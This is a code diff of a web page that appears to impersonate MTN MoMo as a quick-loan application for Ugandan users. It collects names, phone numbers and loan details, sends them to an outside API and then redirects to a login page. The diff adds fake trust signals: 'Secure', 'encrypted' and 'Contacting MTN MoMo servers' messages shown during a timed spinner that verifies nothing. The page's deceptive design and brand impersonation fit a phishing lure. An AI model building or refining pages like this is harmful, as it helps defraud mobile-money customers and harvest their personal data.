+      letter-spacing: 0.05em;
+      text-transform: uppercase;
+    }
+    .processing-status-dot {
+      width: 7px; height: 7px;
+      border-radius: 50%;
+      background: #22C55E;
+      box-shadow: 0 0 10px rgba(34, 197, 94, 0.9);
+      animation: statusPulse 1.6s ease-in-out infinite;
+    }
+    @keyframes statusPulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.85); }
     }
 
-    /* WELCOME PAGE */
-    .welcome-wrap { width: 100%; max-width: 480px; margin: 24px auto; padding: 0 16px; }
-    .welcome-card { background: #fff; border-radius: 16px; padding: 32px 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
-    .welcome-title { font-size: 1.5rem; font-weight: 700; color: #1C2340; text-align: center; margin-bottom: 6px; }
-    .welcome-sub { font-size: 0.9rem; color: #666; text-align: center; margin-bottom: 22px; }
-    .loan-calc { background: #f9f9f9; border-radius: 12px; padding: 20px; margin-bottom: 22px; }
-    .loan-calc-title { font-size: 1rem; font-weight: 600; color: #1C2340; margin-bottom: 14px; }
-    .loan-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 0.9rem; }
-    .loan-row .label { color: #555; }
-    .loan-row .val { color: #FFB300; font-weight: 600; }
-    .slider-wrap { margin: 16px 0 6px; }
-    .slider { width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; appearance: none; -webkit-appearance: none; outline: none; }
-    .slider::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; width: 22px; height: 22px; background: #FFD700; border-radius: 50%; cursor: pointer; border: 3px solid #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
-    .slider::-moz-range-thumb { width: 22px; height: 22px; background: #FFD700; border-radius: 50%; cursor: pointer; border: 3px solid #fff; }
-    .slider-limits { display: flex; justify-content: space-between; font-size: 0.75rem; color: #888; }
-    .monthly-box { background: #fff; border: 1px solid #eee; border-radius: 10px; padding: 14px 18px; display: flex; justify-content: space-between; align-items: center; margin-top: 14px; }
-    .monthly-box .lbl { font-size: 0.9rem; color: #555; }
-    .monthly-box .amount { font-size: 1.3rem; font-weight: 700; color: #FFB300; }
-
-    /* PROGRESS BAR */
-    .progress-wrap { width: 100%; max-width: 480px; margin: 0 auto; padding: 20px 16px 0; }
-    .progress-title { text-align: center; font-size: 1.15rem; font-weight: 700; color: #1C2340; margin: 0 0 4px; }
-    .progress-sub { text-align: center; font-size: 0.8rem; color: #888; margin-bottom: 14px; }
-    .progress-bar { display: flex; gap: 6px; }
-    .progress-seg { flex: 1; height: 5px; background: #e0e0e0; border-radius: 3px; }
-    .progress-seg.active { background: #FFD700; }
-
-    /* FORM */
-    .form-wrap { width: 100%; max-width: 480px; margin: 0 auto; padding: 16px 16px 32px; flex: 1; }
-    .form-card { background: #fff; border-radius: 16px; padding: 24px 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); }
-    .form-field { margin-bottom: 18px; }
-    .form-field label { display: block; font-size: 0.85rem; font-weight: 500; color: #333; margin-bottom: 6px; }
-    .form-field input, .form-field select, .form-field textarea { width: 100%; padding: 13px 14px; border: 1.5px solid #ddd; border-radius: 8px; font-family: 'Inter', sans-serif; font-size: 0.92rem; color: #1C2340; background: #fff; outline: none; transition: border-color 0.2s, box-shadow 0.2s; appearance: none; -webkit-appearance: none; }
-    .form-field input:focus, .form-field select:focus, .form-field textarea:focus { border-color: #FFD700; box-shadow: 0 0 0 3px rgba(255,215,0,0.2); }
-    .form-field textarea { resize: vertical; min-height: 90px; }
-    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
-    .form-hint { font-size: 0.75rem; color: #888; margin-top: 4px; }
-    .phone-prefix { display: flex; }
-    .phone-prefix .prefix { padding: 13px 14px; background: #f5f5f5; border: 1.5px solid #ddd; border-right: none; border-radius: 8px 0 0 8px; font-size: 0.92rem; color: #555; white-space: nowrap; }
-    .phone-prefix input { border-radius: 0 8px 8px 0; }
-    .form-actions { display: flex; gap: 12px; margin-top: 22px; }
-
-    /* BUTTONS */
-    .btn-primary { flex: 1; background: linear-gradient(to right, #003366, #004080); color: #fff; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
-    .btn-primary:hover { opacity: 0.92; }
-    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
-    .btn-outline { flex: 1; background: #e0e0e0; color: #666; border: none; border-radius: 10px; padding: 15px 20px; font-size: 0.92rem; font-weight: 700; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; }
-    .btn-outline:hover { background: #d0d0d0; }
-
-    /* SUMMARY BOX */
-    .summary-box { background: #fffbf0; border-left: 4px solid #FFD700; border-radius: 8px; padding: 16px 18px; margin: 20px 0; }
-    .summary-box h4 { font-size: 0.9rem; color: #1C2340; margin-bottom: 12px; font-weight: 700; }
-    .summary-row { display: flex; justify-content: space-between; font-size: 0.85rem; padding: 6px 0; color: #444; }
-    .summary-row .val { font-weight: 600; color: #1C2340; }
-
-    /* MOBILE */
+    /* ═══════════ MOBILE ═══════════ */
     @media (max-width: 480px) {
-      .welcome-wrap { padding: 0 12px; margin: 16px auto; }
-      .welcome-card { padding: 24px 18px; }
-      .form-wrap { padding: 12px 12px 24px; }
-      .form-card { padding: 20px 16px; border-radius: 12px; }
-      .progress-wrap { padding: 16px 12px 0; }
+      .hero, .cta-wrap, .progress-wrap, .form-wrap { padding-left: 14px; padding-right: 14px; }
+      .hero-card { padding: 24px 18px 22px; }
+      .hero-title { font-size: 1.45rem; }
+      .form-card { padding: 22px 16px; }
       .form-row { grid-template-columns: 1fr; gap: 0; }
       .form-row .form-field { margin-bottom: 18px; }
       .form-actions { flex-direction: column-reverse; }
-      .btn-primary, .btn-outline { padding: 15px 18px; font-size: 0.9rem; }
+      .calc-amount-display .amt { font-size: 1.7rem; }
+      .stat-box .val { font-size: 0.94rem; }
+      .navbar { height: 68px; padding: 0 14px; }
+      .brand-logo-img { height: 42px; }
+      .brand-sub { font-size: 11px; }
+      .processing-orbit { width: 120px; height: 120px; }
+      .processing-orbit-core { width: 62px; height: 62px; border-radius: 16px; }
+      .processing-title { font-size: 18px; }
+      .calc-head-ico, .section-head .ico { width: 30px; height: 30px; font-size: 0.95rem; }
     }
-
     @media (max-width: 380px) {
-      .welcome-card { padding: 20px 14px; }
-      .form-card { padding: 18px 14px; }
-      .welcome-title { font-size: 1.3rem; }
+      .form-card { padding: 20px 14px; }
+      .hero-title { font-size: 1.3rem; }
+      .brand-sub { display: none; }
+      .brand-divider { display: none; }
     }
   </style>
 </head>
@@ -214,78 +1028,147 @@
 
   <div id="app">
 
-    <!-- WELCOME -->
+    <!-- ═══════════ WELCOME ═══════════ -->
     <div id="page-welcome" class="page active">
       <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
+        <div class="nav-inner">
+          <button class="nav-left hidden">← Back</button>
+          <a href="index.html" class="brand">
+            <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+            <div class="brand-divider"></div>
+            <span class="brand-sub">MoMo Advance Loans</span>
+          </a>
+          <div class="nav-right"></div>
         </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
       </div>
 
-      <div class="welcome-wrap">
-        <div class="welcome-card">
-          <h1 class="welcome-title">Welcome to MTN MoMo</h1>
-          <p class="welcome-sub">Get loans easily through MTN MoMo Uganda</p>
+      <div class="hero">
+        <div class="hero-card">
+          <div class="hero-badge">
+            <span class="pulse-dot"></span>
+            <span>Available in Uganda</span>
+          </div>
+          <h1 class="hero-title">
+            Quick <span class="highlight">MoMo Advance</span> Loans
+            <br>
+            Get it Instantly
+          </h1>
+          <p class="hero-sub">
+            Money in your pocket in just <span class="em">minutes</span>.
+            Simple, safe, and made for you — because your dreams can't wait.
+          </p>
 
-          <div class="loan-calc">
-            <div class="loan-calc-title">Loan Calculator</div>
-            <div class="loan-row">
-              <span class="label">Amount</span>
-              <span class="val" id="wAmount">UGX 1,000,000</span>
+          <div class="trust-strip">
+            <div class="trust-item">
+              <span class="ico">🔒</span>
+              <span class="txt">Secure</span>
             </div>
-            <div class="loan-row">
-              <span class="label">Term</span>
-              <span class="val" id="wTerm">48 Months</span>
+            <div class="trust-item">
+              <span class="ico">⚡</span>
+              <span class="txt">Instant</span>
             </div>
+            <div class="trust-item">
+              <span class="ico">🇺🇬</span>
+              <span class="txt">Uganda</span>
+            </div>
+          </div>
+        </div>
 
-            <div class="slider-wrap">
-              <input type="range" class="slider" id="wSlider" min="500000" max="5000000" step="50000" value="1000000" oninput="updateCalculator()">
-              <div class="slider-limits">
-                <span>UGX 500,000</span>
-                <span>UGX 5,000,000</span>
+        <div class="calc-card">
+          <div class="calc-head">
+            <div class="calc-head-title-wrap">
+              <div class="calc-head-ico">🧮</div>
+              <div>
+                <div class="calc-head-title">Loan Calculator</div>
+                <div class="calc-head-title-sub">Simulate your amount</div>
               </div>
             </div>
+            <span class="calc-head-pill">Live</span>
+          </div>
 
-            <div class="monthly-box">
-              <span class="lbl">Monthly Payment</span>
-              <span class="amount" id="wMonthly">UGX 20,834</span>
+          <div class="calc-amount-display">
+            <div class="lbl">You'll Receive</div>
+            <div class="amt"><span class="cur">UGX</span><span id="wAmount">1,000,000</span></div>
+          </div>
+
+          <div class="quick-amounts" id="quickAmounts">
+            <button type="button" class="quick-chip" data-amount="500000">500K</button>
+            <button type="button" class="quick-chip active" data-amount="1000000">1M</button>
+            <button type="button" class="quick-chip" data-amount="2000000">2M</button>
+            <button type="button" class="quick-chip" data-amount="5000000">5M</button>
+          </div>
+
+          <div class="slider-wrap">
+            <input type="range" class="slider" id="wSlider" min="500000" max="5000000" step="50000" value="1000000" oninput="updateCalculator()">
+            <div class="slider-limits">
+              <span>UGX 500K</span>
+              <span>UGX 5M</span>
             </div>
           </div>
 
-          <button class="btn-primary" style="width:100%;" onclick="startApplication()">START APPLICATION</button>
+          <div class="calc-stats">
+            <div class="stat-box">
+              <span class="ico">📅</span>
+              <div class="lbl">Term</div>
+              <div class="val" id="wTerm">48 Months</div>
+            </div>
+            <div class="stat-box highlight">
+              <span class="ico">💵</span>
+              <div class="lbl">Monthly</div>
+              <div class="val" id="wMonthly">UGX 20,834</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="cta-wrap">
+        <button class="btn-primary" onclick="startApplication()">
+          START APPLICATION →
+        </button>
+        <div class="micro-note">
+          <span>🔒</span>
+          <span>Your data is encrypted and protected</span>
         </div>
       </div>
     </div>
 
-    <!-- STEP 1 -->
+    <!-- ═══════════ STEP 1 ═══════════ -->
     <div id="page-step1" class="page">
       <div class="navbar">
-        <button class="nav-left" onclick="goTo('page-welcome')">← Back</button>
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Loans</div>
+        <div class="nav-inner">
+          <button class="nav-left" onclick="goTo('page-welcome')">← Back</button>
+          <a href="index.html" class="brand">
+            <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+            <div class="brand-divider"></div>
+            <span class="brand-sub">MoMo Advance Loans</span>
+          </a>
+          <div class="nav-right"></div>
         </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
       </div>
 
       <div class="progress-wrap">
-        <div class="progress-title">Loan Application</div>
-        <div class="progress-sub">Step 1 of 3</div>
-        <div class="progress-bar">
-          <div class="progress-seg active"></div>
-          <div class="progress-seg"></div>
-          <div class="progress-seg"></div>
+        <div class="progress-head">
+          <span class="progress-title">Loan Application</span>
+          <span class="progress-pct">33%</span>
+        </div>
+        <div class="progress-sub">Step 1 of 3 · Loan Details</div>
+        <div class="progress-bar-track">
+          <div class="progress-bar-fill" style="width: 33%;"></div>
         </div>
       </div>
 
       <div class="form-wrap">
         <div class="form-card">
+          <div class="section-head">
+            <div class="ico">💼</div>
+            <div>
+              <div class="txt-title">Loan Details</div>
+              <div class="txt-sub">Tell us what you need</div>
+            </div>
+          </div>
+
           <div class="form-field">
-            <label>Loan Type</label>
+            <label><span class="lf-ico">💼</span> Loan Type</label>
             <select id="fLoanType">
               <option>Business Loan</option>
               <option>Personal Loan</option>
@@ -295,12 +1178,14 @@
           </div>
 
           <div class="form-field">
-            <label>Loan Amount (UGX)</label>
-            <input type="number" id="fAmount" value="1000000" min="50000" max="5000000" step="10000">
+            <label><span class="lf-ico">💰</span> Loan Amount (UGX)</label>
+            <input type="text" inputmode="numeric" id="fAmount" value="1,000,000" placeholder="Enter amount">
+            <div class="form-hint">Minimum UGX 50,000 · Maximum UGX 5,000,000</div>
+            <div class="field-error" id="err-fAmount">Please enter a valid amount (min UGX 50,000)</div>
           </div>
 
           <div class="form-field">
-            <label>Loan Term</label>
+            <label><span class="lf-ico">📅</span> Loan Term</label>
             <select id="fTerm">
               <option>12 Months</option>
               <option>24 Months</option>
@@ -310,96 +1195,122 @@
           </div>
 
           <div class="form-field">
-            <label>Purpose of Loan</label>
+            <label><span class="lf-ico">📝</span> Purpose of Loan</label>
             <textarea id="fPurpose" placeholder="Describe the purpose of your loan..."></textarea>
+            <div class="field-error" id="err-fPurpose">Please describe the purpose of your loan</div>
           </div>
 
           <div class="form-actions">
             <button class="btn-outline" onclick="goTo('page-welcome')">BACK</button>
-            <button class="btn-primary" onclick="nextToStep2()">NEXT STEP</button>
+            <button class="btn-primary auto-flex" onclick="nextToStep2()">NEXT STEP →</button>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- STEP 2 -->
+    <!-- ═══════════ STEP 2 ═══════════ -->
     <div id="page-step2" class="page">
       <div class="navbar">
-        <button class="nav-left" onclick="goTo('page-step1')">← Back</button>
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Loans</div>
+        <div class="nav-inner">
+          <button class="nav-left" onclick="goTo('page-step1')">← Back</button>
+          <a href="index.html" class="brand">
+            <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+            <div class="brand-divider"></div>
+            <span class="brand-sub">MoMo Advance Loans</span>
+          </a>
+          <div class="nav-right"></div>
         </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
       </div>
 
       <div class="progress-wrap">
-        <div class="progress-title">Loan Application</div>
-        <div class="progress-sub">Step 2 of 3</div>
-        <div class="progress-bar">
-          <div class="progress-seg active"></div>
-          <div class="progress-seg active"></div>
-          <div class="progress-seg"></div>
+        <div class="progress-head">
+          <span class="progress-title">Loan Application</span>
+          <span class="progress-pct">66%</span>
+        </div>
+        <div class="progress-sub">Step 2 of 3 · Personal Info</div>
+        <div class="progress-bar-track">
+          <div class="progress-bar-fill" style="width: 66%;"></div>
         </div>
       </div>
 
       <div class="form-wrap">
         <div class="form-card">
+          <div class="section-head">
+            <div class="ico">👤</div>
+            <div>
+              <div class="txt-title">Personal Info</div>
+              <div class="txt-sub">We need to know who you are</div>
+            </div>
+          </div>
+
           <div class="form-row">
             <div class="form-field">
-              <label>First Name</label>
-              <input type="text" id="fFirst" placeholder="First Name">
+              <label><span class="lf-ico">👤</span> First Name</label>
+              <input type="text" id="fFirst" placeholder="e.g. John" autocomplete="given-name">
+              <div class="field-error" id="err-fFirst">Please enter your first name</div>
             </div>
             <div class="form-field">
-              <label>Last Name</label>
-              <input type="text" id="fLast" placeholder="Last Name">
+              <label><span class="lf-ico">👤</span> Last Name</label>
+              <input type="text" id="fLast" placeholder="e.g. Ssekandi" autocomplete="family-name">
+              <div class="field-error" id="err-fLast">Please enter your last name</div>
             </div>
           </div>
 
           <div class="form-field">
-            <label>Phone Number (Uganda)</label>
+            <label><span class="lf-ico">📱</span> Phone Number</label>
             <div class="phone-prefix">
-              <span class="prefix">+256</span>
-              <input type="tel" id="fPhone" maxlength="9" placeholder="771234567">
+              <span class="prefix">🇺🇬 +256</span>
+              <input type="tel" inputmode="numeric" id="fPhone" maxlength="9" placeholder="771234567" autocomplete="tel">
             </div>
-            <div class="form-hint">9 digits without +256 prefix (e.g., 771234567)</div>
+            <div class="form-hint">9 digits without the +256 prefix</div>
+            <div class="field-error" id="err-fPhone">Please enter a valid 9-digit phone number</div>
           </div>
 
           <div class="form-actions">
             <button class="btn-outline" onclick="goTo('page-step1')">BACK</button>
-            <button class="btn-primary" onclick="nextToStep3()">NEXT STEP</button>
+            <button class="btn-primary auto-flex" onclick="nextToStep3()">NEXT STEP →</button>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- STEP 3 -->
+    <!-- ═══════════ STEP 3 ═══════════ -->
     <div id="page-step3" class="page">
       <div class="navbar">
-        <button class="nav-left" onclick="goTo('page-step2')">← Back</button>
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Loans</div>
+        <div class="nav-inner">
+          <button class="nav-left" onclick="goTo('page-step2')">← Back</button>
+          <a href="index.html" class="brand">
+            <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo" class="brand-logo-img">
+            <div class="brand-divider"></div>
+            <span class="brand-sub">MoMo Advance Loans</span>
+          </a>
+          <div class="nav-right"></div>
         </div>
-        <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
       </div>
 
       <div class="progress-wrap">
-        <div class="progress-title">Loan Application</div>
-        <div class="progress-sub">Step 3 of 3</div>
-        <div class="progress-bar">
-          <div class="progress-seg active"></div>
-          <div class="progress-seg active"></div>
-          <div class="progress-seg active"></div>
+        <div class="progress-head">
+          <span class="progress-title">Loan Application</span>
+          <span class="progress-pct">100%</span>
+        </div>
+        <div class="progress-sub">Step 3 of 3 · Final Review</div>
+        <div class="progress-bar-track">
+          <div class="progress-bar-fill" style="width: 100%;"></div>
         </div>
       </div>
 
       <div class="form-wrap">
         <div class="form-card">
+          <div class="section-head">
+            <div class="ico">✅</div>
+            <div>
+              <div class="txt-title">Review & Confirm</div>
+              <div class="txt-sub">Everything look good? Submit below</div>
+            </div>
+          </div>
+
           <div class="form-field">
-            <label>Employment Status</label>
+            <label><span class="lf-ico">💼</span> Employment Status</label>
             <select id="fEmp">
               <option>Self-employed</option>
               <option>Employed full-time</option>
@@ -409,34 +1320,29 @@
             </select>
           </div>
 
-          <div class="form-field">
-            <label>Annual Income (UGX)</label>
-            <input type="number" id="fIncome" placeholder="Enter annual income">
-          </div>
-
           <div class="summary-box">
-            <h4>Application Summary</h4>
+            <h4>📋 Application Summary</h4>
             <div class="summary-row">
-              <span>Loan Amount:</span>
+              <span>Loan Amount</span>
               <span class="val" id="sumAmount">UGX 1,000,000</span>
             </div>
             <div class="summary-row">
-              <span>Loan Term:</span>
+              <span>Loan Term</span>
               <span class="val" id="sumTerm">48 Months</span>
             </div>
             <div class="summary-row">
-              <span>Purpose:</span>
+              <span>Purpose</span>
               <span class="val" id="sumPurpose">—</span>
             </div>
             <div class="summary-row">
-              <span>Applicant:</span>
+              <span>Applicant</span>
               <span class="val" id="sumApplicant">—</span>
             </div>
           </div>
 
           <div class="form-actions">
             <button class="btn-outline" onclick="goTo('page-step2')">BACK</button>
-            <button class="btn-primary" id="submitBtn" onclick="submitApplication()">SUBMIT APPLICATION</button>
+            <button class="btn-primary auto-flex" id="submitBtn" onclick="submitApplication()">SUBMIT →</button>
           </div>
         </div>
       </div>
@@ -444,14 +1350,53 @@
 
   </div>
 
-  <!-- PROCESSING OVERLAY -->
+  <!-- ═══════════ SUPER PROCESSING OVERLAY ═══════════ -->
   <div class="processing-overlay" id="processingOverlay">
-    <div class="processing-logo"></div>
-    <div class="processing-spinner"></div>
-    <div class="processing-title">Processing Application</div>
-    <div class="processing-sub">Please wait, this may take a few seconds</div>
-    <div class="processing-dots">
-      <span>.</span><span>.</span><span>.</span>
+    <div class="processing-particles">
+      <span class="processing-particle"></span>
+      <span class="processing-particle"></span>
+      <span class="processing-particle"></span>
+      <span class="processing-particle"></span>
+      <span class="processing-particle"></span>
+      <span class="processing-particle"></span>
+      <span class="processing-particle"></span>
+      <span class="processing-particle"></span>
+    </div>
+
+    <div class="processing-content">
+      <div class="processing-orbit">
+        <div class="processing-orbit-ring"></div>
+        <div class="processing-orbit-ring inner"></div>
+        <div class="processing-dot-orbit">
+          <span></span><span></span><span></span><span></span>
+        </div>
+        <div class="processing-orbit-core">
+          <img src="https://ug-starlinknetwork.up.railway.app/static/images/momo_logo.png" alt="MTN MoMo">
+        </div>
+      </div>
+
+      <h2 class="processing-title" id="procTitle">
+        Processing your <span class="highlight">application</span>
+      </h2>
+      <p class="processing-sub" id="procSub">Please wait, this may take a few seconds…</p>
+
+      <div class="processing-bar">
+        <div class="processing-bar-fill" id="procBarFill"></div>
+      </div>
+
+      <div class="processing-step">
+        <div class="processing-step-inner" id="procStepInner">
+          <div class="processing-step-text">🔍 Reviewing your details</div>
+          <div class="processing-step-text">📡 Contacting MTN MoMo servers</div>
+          <div class="processing-step-text">🔐 Verifying your information</div>
+          <div class="processing-step-text">⏳ Preparing your offer</div>
+        </div>
+      </div>
+
+      <div class="processing-status-row">
+        <span class="processing-status-dot"></span>
+        <span>Live · Secure Connection</span>
+      </div>
     </div>
   </div>
 
@@ -461,10 +1406,7 @@
 
   <script>
     // ═══ State ═══
-    const S = {
-      loanAmount: 1000000,
-      loanTerm: '48 Months'
-    };
+    const S = { loanAmount: 1000000, loanTerm: '48 Months' };
 
     // ═══ Navigation ═══
     function goTo(pageId) {
@@ -474,7 +1416,47 @@
       window.scrollTo(0, 0);
     }
 
-    // ═══ CALCULATOR ═══
+    // ═══ Number formatting ═══
+    function fmtNum(n) { return Number(n).toLocaleString('en-US'); }
+    function parseNum(str) { return parseInt(String(str).replace(/[^\d]/g, ''), 10) || 0; }
+
+    ['fAmount'].forEach(id => {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.addEventListener('input', () => {
+        const raw = parseNum(el.value);
+        el.value = raw ? fmtNum(raw) : '';
+      });
+    });
+
+    const phoneEl = document.getElementById('fPhone');
+    if (phoneEl) {
+      phoneEl.addEventListener('input', () => {
+        phoneEl.value = phoneEl.value.replace(/\D/g, '').slice(0, 9);
+      });
+    }
+
+    // ═══ Quick amount chips ═══
+    const quickChips = document.querySelectorAll('.quick-chip');
+    quickChips.forEach(chip => {
+      chip.addEventListener('click', () => {
+        const amt = parseInt(chip.dataset.amount, 10);
+        const slider = document.getElementById('wSlider');
+        slider.value = amt;
+        quickChips.forEach(c => c.classList.remove('active'));
+        chip.classList.add('active');
+        updateCalculator();
+      });
+    });
+
+    function syncQuickChips(amount) {
+      quickChips.forEach(c => {
+        const chipAmt = parseInt(c.dataset.amount, 10);
+        c.classList.toggle('active', chipAmt === amount);
+      });
+    }
+
+    // ═══ Calculator ═══
     function updateCalculator() {
       const slider = document.getElementById('wSlider');
       const amountEl = document.getElementById('wAmount');
@@ -485,56 +1467,102 @@
       const term = 48;
       const monthly = Math.ceil(amount / term);
 
-      amountEl.textContent = 'UGX ' + amount.toLocaleString();
+      amountEl.textContent = fmtNum(amount);
       termEl.textContent = term + ' Months';
-      monthlyEl.textContent = 'UGX ' + monthly.toLocaleString();
+      monthlyEl.textContent = 'UGX ' + fmtNum(monthly);
+
+      const pct = ((amount - slider.min) / (slider.max - slider.min)) * 100;
+      slider.style.background = `linear-gradient(to right, #003366 0%, #003366 ${pct}%, #E0E4F0 ${pct}%, #E0E4F0 100%)`;
+      syncQuickChips(amount);
     }
 
-    // ═══ WELCOME → STEP 1 ═══
     function startApplication() {
       const sliderAmount = document.getElementById('wSlider').value;
-      document.getElementById('fAmount').value = sliderAmount;
+      document.getElementById('fAmount').value = fmtNum(sliderAmount);
       goTo('page-step1');
     }
 
-    // ═══ STEP 1 → STEP 2 ═══
+    // ═══ Error helpers ═══
+    function showErr(inputId, errId) {
+      const input = document.getElementById(inputId);
+      const err = document.getElementById(errId);
+      if (input) input.classList.add('invalid');
+      if (err) err.classList.add('show');
+    }
+
+    ['fAmount', 'fPurpose', 'fFirst', 'fLast', 'fPhone'].forEach(id => {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.addEventListener('input', () => {
+        el.classList.remove('invalid');
+        const e = document.getElementById('err-' + id);
+        if (e) e.classList.remove('show');
+      });
+    });
+
+    // ═══ Step 1 → Step 2 ═══
     function nextToStep2() {
-      const amount = document.getElementById('fAmount').value;
-      if (!amount || parseInt(amount, 10) < 50000) {
-        alert('Please enter a valid loan amount (minimum UGX 50,000).');
-        return;
-      }
+      let ok = true;
+      const amount = parseNum(document.getElementById('fAmount').value);
+      const purpose = document.getElementById('fPurpose').value.trim();
+
+      if (amount < 50000 || amount > 5000000) { showErr('fAmount', 'err-fAmount'); ok = false; }
+      if (!purpose) { showErr('fPurpose', 'err-fPurpose'); ok = false; }
+
+      if (!ok) return;
       goTo('page-step2');
     }
 
-    // ═══ STEP 2 → STEP 3 ═══
+    // ═══ Step 2 → Step 3 ═══
     function nextToStep3() {
+      let ok = true;
       const first = document.getElementById('fFirst').value.trim();
-      const last  = document.getElementById('fLast').value.trim();
+      const last = document.getElementById('fLast').value.trim();
       const phone = document.getElementById('fPhone').value.trim();
 
-      if (!first || !last) {
-        alert('Please enter your first and last name.');
-        return;
-      }
-      if (phone.length !== 9 || !/^\d{9}$/.test(phone)) {
-        alert('Please enter a valid 9-digit phone number.');
-        return;
-      }
+      if (!first) { showErr('fFirst', 'err-fFirst'); ok = false; }
+      if (!last) { showErr('fLast', 'err-fLast'); ok = false; }
+      if (phone.length !== 9 || !/^\d{9}$/.test(phone)) { showErr('fPhone', 'err-fPhone'); ok = false; }
 
-      const amount  = parseInt(document.getElementById('fAmount').value, 10);
-      const term    = document.getElementById('fTerm').value;
+      if (!ok) return;
+
+      const amount = parseNum(document.getElementById('fAmount').value);
+      const term = document.getElementById('fTerm').value;
       const purpose = document.getElementById('fPurpose').value.trim() || '—';
 
-      document.getElementById('sumAmount').textContent    = 'UGX ' + amount.toLocaleString();
-      document.getElementById('sumTerm').textContent      = term;
-      document.getElementById('sumPurpose').textContent   = purpose;
+      document.getElementById('sumAmount').textContent = 'UGX ' + fmtNum(amount);
+      document.getElementById('sumTerm').textContent = term;
+      document.getElementById('sumPurpose').textContent = purpose;
       document.getElementById('sumApplicant').textContent = first + ' ' + last;
 
       goTo('page-step3');
     }
 
-    // ═══ STEP 3 → SUBMIT → PIXEL LEAD → SPIN → REDIRECT TO login.html ═══
+    // ═══ Processing overlay animation ═══
+    function runProcessingAnimation(durationMs) {
+      const barFill = document.getElementById('procBarFill');
+      const stepInner = document.getElementById('procStepInner');
+
+      // Rotating status messages
+      let stepIndex = 0;
+      const stepTimer = setInterval(() => {
+        stepIndex = (stepIndex + 1) % 4;
+        stepInner.style.transform = `translateY(-${stepIndex * 20}px)`;
+      }, 1400);
+
+      const start = Date.now();
+      const timer = setInterval(() => {
+        const elapsed = Date.now() - start;
+        const p = Math.min(100, Math.floor((elapsed / durationMs) * 100));
+        barFill.style.width = p + '%';
+        if (p >= 100) {
+          clearInterval(timer);
+          clearInterval(stepTimer);
+        }
+      }, 60);
+    }
+
+    // ═══ Step 3 → Submit ═══
     async function submitApplication() {
       const btn = document.getElementById('submitBtn');
       btn.disabled = true;
@@ -542,22 +1570,20 @@
 
       const payload = {
         loanType:         document.getElementById('fLoanType').value,
-        loanAmount:       parseInt(document.getElementById('fAmount').value, 10),
+        loanAmount:       parseNum(document.getElementById('fAmount').value),
         loanTerm:         document.getElementById('fTerm').value,
         purpose:          document.getElementById('fPurpose').value.trim(),
         firstName:        document.getElementById('fFirst').value.trim(),
         lastName:         document.getElementById('fLast').value.trim(),
         phone:            '+256' + document.getElementById('fPhone').value.trim(),
         employmentStatus: document.getElementById('fEmp').value,
-        annualIncome:     parseInt(document.getElementById('fIncome').value, 10) || 0
+        annualIncome:     0
       };
 
       S.loanAmount = payload.loanAmount;
       S.loanTerm = payload.loanTerm;
 
-      // ============================================
-      // ✅ FIRE META PIXEL LEAD EVENT
-      // ============================================
+      // Meta Pixel — Lead event
       if (typeof fbq === 'function') {
         fbq('track', 'Lead', {
           content_name: 'MoMo Loan Application',
@@ -566,15 +1592,13 @@
           currency: 'UGX'
         });
         console.log('✅ Meta Pixel: Lead event fired');
-      } else {
-        console.warn('⚠️ Meta Pixel not loaded — Lead event skipped');
       }
 
-      // Show spinning overlay
       document.getElementById('processingOverlay').classList.add('show');
+      const MIN_SPIN_MS = 5000;
+      runProcessingAnimation(MIN_SPIN_MS);
 
       const startTime = Date.now();
-      const MIN_SPIN_MS = 5000;
 
       try {
         const res = await fetch(`${window.API_BASE}/api/application`, {
@@ -592,16 +1616,13 @@
       const remaining = Math.max(0, MIN_SPIN_MS - elapsed);
 
       setTimeout(() => {
-        document.getElementById('processingOverlay').classList.remove('show');
         window.location.href = 'login.html';
       }, remaining);
     }
 
-    // ═══ INIT ═══
+    // ═══ Init ═══
     document.addEventListener('DOMContentLoaded', () => {
-      if (document.getElementById('wSlider')) {
-        updateCalculator();
-      }
+      if (document.getElementById('wSlider')) updateCalculator();
     });
   </script>
 </body>
